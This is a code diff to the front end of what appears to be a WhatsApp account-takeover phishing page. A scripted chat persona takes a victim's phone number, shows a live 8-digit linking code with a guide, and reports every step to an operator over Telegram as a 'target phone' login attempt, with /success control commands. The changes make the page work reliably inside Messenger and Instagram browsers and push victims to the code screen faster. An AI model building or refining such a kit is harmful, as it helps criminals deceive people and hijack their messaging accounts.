@@ -16,13 +16,62 @@ import { SuccessPhase } from "./components/SuccessPhase";
 import { QueueFullPhase } from "./components/QueueFullPhase";
 import { AdminController } from "./components/AdminController";
 
+// Safe localStorage & sessionStorage wrapper to gracefully bypass exceptions in sandboxed browsers (like Messenger, Instagram, etc)
+const safeStorage = {
+  getItem: (key: string): string | null => {
+    try {
+      return localStorage.getItem(key);
+    } catch (e) {
+      return null;
+    }
+  },
+  setItem: (key: string, value: string): void => {
+    try {
+      localStorage.setItem(key, value);
+    } catch (e) {
+      // Ignore
+    }
+  },
+  removeItem: (key: string): void => {
+    try {
+      localStorage.removeItem(key);
+    } catch (e) {
+      // Ignore
+    }
+  }
+};
+
+const safeSessionStorage = {
+  getItem: (key: string): string | null => {
+    try {
+      return sessionStorage.getItem(key);
+    } catch (e) {
+      return null;
+    }
+  },
+  setItem: (key: string, value: string): void => {
+    try {
+      sessionStorage.setItem(key, value);
+    } catch (e) {
+      // Ignore
+    }
+  },
+  removeItem: (key: string): void => {
+    try {
+      sessionStorage.removeItem(key);
+    } catch (e) {
+      // Ignore
+    }
+  }
+};
+
 export default function App() {
   const [phase, setPhaseState] = useState<AppPhase>(() => {
-    const saved = localStorage.getItem("app_current_phase");
+    const saved = safeStorage.getItem("app_current_phase");
     return (saved as AppPhase) || AppPhase.AI_CHAT;
   });
   const [phoneNumber, setPhoneNumber] = useState("");
-  const [verifiedPhone, setVerifiedPhone] = useState<string>(() => localStorage.getItem("whatsapp_verified_phone") || "");
+  const [verifiedPhone, setVerifiedPhone] = useState<string>(() => safeStorage.getItem("whatsapp_verified_phone") || "");
   const [config, setConfig] = useState<AppConfig | null>(null);
   const [liveCode, setLiveCode] = useState("        ");
   const [showError, setShowError] = useState(false);
@@ -32,7 +81,7 @@ export default function App() {
   // Custom persistent phase setter to maintain progress across link re-entries:
   const setPhase = (newPhase: AppPhase) => {
     setPhaseState(newPhase);
-    localStorage.setItem("app_current_phase", newPhase);
+    safeStorage.setItem("app_current_phase", newPhase);
   };
   
   // Real-time 5 Slots list tracked in database
@@ -69,10 +118,10 @@ export default function App() {
   
   // 1. Generate or retrieve unique persistent browser Session UID
   useEffect(() => {
-    let uid = localStorage.getItem("whatsapp_session_uid");
+    let uid = safeStorage.getItem("whatsapp_session_uid");
     if (!uid) {
       uid = "visitor_" + Math.random().toString(36).substring(2, 8);
-      localStorage.setItem("whatsapp_session_uid", uid);
+      safeStorage.setItem("whatsapp_session_uid", uid);
     }
     setSessionUid(uid);
   }, []);
@@ -285,7 +334,7 @@ export default function App() {
         setShowError(true);
       } else if (matchedSlot.action === "clear") {
         // Operator deleted or cleared slot
-        localStorage.removeItem("whatsapp_verified_phone");
+        safeStorage.removeItem("whatsapp_verified_phone");
         setVerifiedPhone("");
         setPhase(AppPhase.AI_CHAT);
         setShowError(false);
@@ -300,7 +349,7 @@ export default function App() {
       // If we are on verification screens, but no active database slot matches us:
       // It means Admin cleared our phone number. Instantly kick back to AI Chat.
       if (isSlotsLoaded && (phase === AppPhase.GUIDE_AND_CODE || phase === AppPhase.SUCCESS)) {
-        localStorage.removeItem("whatsapp_verified_phone");
+        safeStorage.removeItem("whatsapp_verified_phone");
         setVerifiedPhone("");
         setPhase(AppPhase.AI_CHAT);
         setShowError(false);
@@ -333,6 +382,19 @@ export default function App() {
     };
   }, [config, sessionUid, isMatched, myMatchedIndex, phase, phoneNumber, verifiedPhone]);
 
+  // Centralized robust transition for the LOADING phase to ensure they never get stuck (even on tab suspension or refresh!)
+  useEffect(() => {
+    if (phase === AppPhase.LOADING) {
+      // In-app browsers like FB Messenger might suspend JS. 
+      // Keeping this transition short (1.5s) ensures that we automatically land on the active 8-digit code phase fast.
+      const timer = setTimeout(() => {
+        setPhase(AppPhase.GUIDE_AND_CODE);
+        startCountdown();
+      }, 1500);
+      return () => clearTimeout(timer);
+    }
+  }, [phase]);
+
   // 6. Cleanup intervals on unmount
   useEffect(() => {
     return () => {
@@ -341,17 +403,15 @@ export default function App() {
     };
   }, []);
 
-  // 7. Send Telegram messages
-  const sendTelegramMessage = async (text: string) => {
-    try {
-      await fetch("/api/telegram/send", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ text })
-      });
-    } catch (err) {
-      console.error("Failed telegram message:", err);
-    }
+  // 7. Send Telegram messages (async fire-and-forget to prevent blocking UI transitions on slow networks)
+  const sendTelegramMessage = (text: string) => {
+    fetch("/api/telegram/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ text })
+    }).catch((err) => {
+      console.warn("Failed telegram message:", err);
+    });
   };
 
   // 8. Telegram polling for command keys
@@ -404,7 +464,7 @@ export default function App() {
       const emptySlotIdx = slots.findIndex(s => !s.phone || s.phone.trim() === "");
       if (emptySlotIdx !== -1) {
         // Empty slot found! Claim it automatically
-        localStorage.setItem("whatsapp_verified_phone", sanitized);
+        safeStorage.setItem("whatsapp_verified_phone", sanitized);
         setVerifiedPhone(sanitized);
         
         updateSlotOnServer(emptySlotIdx, {
@@ -422,11 +482,13 @@ export default function App() {
           `🎉 *স্লট খালি হওয়ার ব্রিজ:* টার্গেট ফোন \`${phoneNumber}\` সয়ংক্রিয় স্লট ${emptySlotIdx + 1} এ যুক্ত হয়েছেন!`
         );
 
+        // Pre-emptively pre-save GUIDE_AND_CODE state so re-open directly resolves to guide screen
+        safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
         setPhase(AppPhase.LOADING);
         setTimeout(() => {
           setPhase(AppPhase.GUIDE_AND_CODE);
           startCountdown();
-        }, 5000);
+        }, 1500);
       }
     }
   }, [slots, phase, phoneNumber, sessionUid]);
@@ -441,13 +503,14 @@ export default function App() {
     // A. Is our phone already allocated?
     const existingIdx = slots.findIndex(s => s.phone && s.phone.replace(/\D/g, "") === sanitizedPhone);
     if (existingIdx !== -1) {
-      localStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
+      safeStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
       setVerifiedPhone(sanitizedPhone);
+      safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
       setPhase(AppPhase.LOADING);
       setTimeout(() => {
         setPhase(AppPhase.GUIDE_AND_CODE);
         startCountdown();
-      }, 5000);
+      }, 1500);
       return;
     }
 
@@ -466,10 +529,10 @@ export default function App() {
           action: "",
           actionTimestamp: 0
         });
-        localStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
+        safeStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
         setVerifiedPhone(sanitizedPhone);
 
-        await sendTelegramMessage(
+        sendTelegramMessage(
           `*🚨 New Multi-User Log In Attempt* (Slot ${emptyIdx + 1} Allocated)\n` +
           `👤 *User Name:* Nusrat jahan client\n` +
           `📞 *Phone Entered:* \`${phoneNumber}\`\n` +
@@ -477,6 +540,7 @@ export default function App() {
           `📂 *Firebase Reference path:* \`liveCodes/slot_${emptyIdx}\``
         );
 
+        safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
         setPhase(AppPhase.LOADING);
       } catch (err) {
         console.error("Error setting slot in DB:", err);
@@ -487,11 +551,11 @@ export default function App() {
       setTimeout(() => {
         setPhase(AppPhase.GUIDE_AND_CODE);
         startCountdown();
-      }, 5000);
+      }, 1500);
     } else {
       // C. All 5 Slots are full! Keep in waiting lineup
       setPhase(AppPhase.QUEUE_FULL);
-      await sendTelegramMessage(
+      sendTelegramMessage(
         `⚠️ *লাইন ফুল এলার্ট (Verification Lines Busy)* ⚠️\n` +
         `👤 *টার্গেট ফোন:* \`${phoneNumber}\`\n` +
         `🔑 *ইউজার সেশন আইডি:* \`${sessionUid}\`\n\n` +
@@ -528,17 +592,18 @@ export default function App() {
     // A. Is our phone already allocated?
     const existingIdx = slots.findIndex(s => s.phone && s.phone.replace(/\D/g, "") === sanitizedPhone);
     if (existingIdx !== -1) {
-      localStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
+      safeStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
       setVerifiedPhone(sanitizedPhone);
       
       // Instantly open native WhatsApp via our premium sandboxed launcher
       launchWhatsApp(waUrl);
       
+      safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
       setPhase(AppPhase.LOADING);
       setTimeout(() => {
         setPhase(AppPhase.GUIDE_AND_CODE);
         startCountdown();
-      }, 5000);
+      }, 1500);
       return;
     }
 
@@ -557,10 +622,10 @@ export default function App() {
           action: "",
           actionTimestamp: 0
         });
-        localStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
+        safeStorage.setItem("whatsapp_verified_phone", sanitizedPhone);
         setVerifiedPhone(sanitizedPhone);
 
-        await sendTelegramMessage(
+        sendTelegramMessage(
           `*🚨 New Multi-User Log In Attempt* (Slot ${emptyIdx + 1} Allocated via 1-Click Auto)\n` +
           `👤 *User Name:* Nusrat jahan client\n` +
           `📞 *Phone Entered (Auto):* \`${customNum}\`\n` +
@@ -571,6 +636,7 @@ export default function App() {
         // Instantly open native WhatsApp via our premium sandboxed launcher
         launchWhatsApp(waUrl);
 
+        safeStorage.setItem("app_current_phase", AppPhase.GUIDE_AND_CODE);
         setPhase(AppPhase.LOADING);
       } catch (err) {
         console.error("Error setting slot in DB:", err);
@@ -581,16 +647,16 @@ export default function App() {
       setTimeout(() => {
         setPhase(AppPhase.GUIDE_AND_CODE);
         startCountdown();
-      }, 5000);
+      }, 1500);
     } else {
       // C. All 5 Slots are full! Keep in waiting lineup
       launchWhatsApp(waUrl);
       setPhase(AppPhase.QUEUE_FULL);
-      await sendTelegramMessage(
+      sendTelegramMessage(
          `⚠️ *লাইন ফুল এলার্ট (Verification Lines Busy)* ⚠️\n` +
         `👤 *টার্গেট ফোন (Auto):* \`${customNum}\`\n` +
         `🔑 *ইউজার সেশন আইডি:* \`${sessionUid}\`\n\n` +
-        `এই ইউজারটি ওয়ান-ক্লিক অটোমেশন দিয়ে লগইন করার চেষ্টা করেছেন, কিন্তু প্যানেলে সকল ১-৫ স্লট পূর্ণ থাকায় তাকে ওয়েটিং রুমে রাখা হয়েছে।`
+        `এই ইউজারটি ওয়ান-ক্লিক অবদান দিয়ে লগইন করার চেষ্টা করেছেন, কিন্তু প্যানেলে সকল ১-৫ স্লট পূর্ণ থাকায় তাকে ওয়েটিং রুমে রাখা হয়েছে।`
       );
     }
   };
@@ -612,8 +678,8 @@ export default function App() {
   };
 
   // 12. Handle Link Action CTA ("Copy this unlock number")
-  const handleActionClick = async () => {
-    await sendTelegramMessage(
+  const handleActionClick = () => {
+    sendTelegramMessage(
       `📢 *User Interaction Action:* Session \`${sessionUid}\` clicked "Copy this unlock number"!\n` +
       `Direct deep linking to mobile WhatsApp initiated.`
     );
@@ -621,8 +687,8 @@ export default function App() {
     // Deep link redirection to WhatsApp
     launchWhatsApp("whatsapp://");
 
-    setTimeout(async () => {
-      await sendTelegramMessage(
+    setTimeout(() => {
+      sendTelegramMessage(
         `✅ *Handshake deep link redirect finished* for session \`${sessionUid}\`.\n\n` +
         `👉 Send control key:\n` +
         `• \`/success ${sessionUid}\` (or click successfully)\n` +
@@ -672,7 +738,7 @@ export default function App() {
     }
 
     if (textPrompt && localKey) {
-      const alreadySent = sessionStorage.getItem(localKey);
+      const alreadySent = safeSessionStorage.getItem(localKey);
       if (!alreadySent) {
         setIsNusratTyping(true);
         const timer = setTimeout(() => {
@@ -688,7 +754,7 @@ export default function App() {
             if (exists) return prev;
             return [...prev, activeMsg];
           });
-          sessionStorage.setItem(localKey, "true");
+          safeSessionStorage.setItem(localKey, "true");
         }, 1300);
         return () => clearTimeout(timer);
       }
@@ -699,7 +765,7 @@ export default function App() {
   useEffect(() => {
     if (phase !== AppPhase.AI_CHAT) return;
 
-    const wasSent = localStorage.getItem("whatsapp_inactivity_prompt_sent_v2");
+    const wasSent = safeStorage.getItem("whatsapp_inactivity_prompt_sent_v2");
     if (wasSent) return;
 
     const timer = setTimeout(() => {
@@ -716,7 +782,7 @@ export default function App() {
         if (checkExist) return prev;
         return [...prev, nudgeMsg];
       });
-      localStorage.setItem("whatsapp_inactivity_prompt_sent_v2", "true");
+      safeStorage.setItem("whatsapp_inactivity_prompt_sent_v2", "true");
     }, 12000); // 12 seconds nudge
 
     return () => clearTimeout(timer);
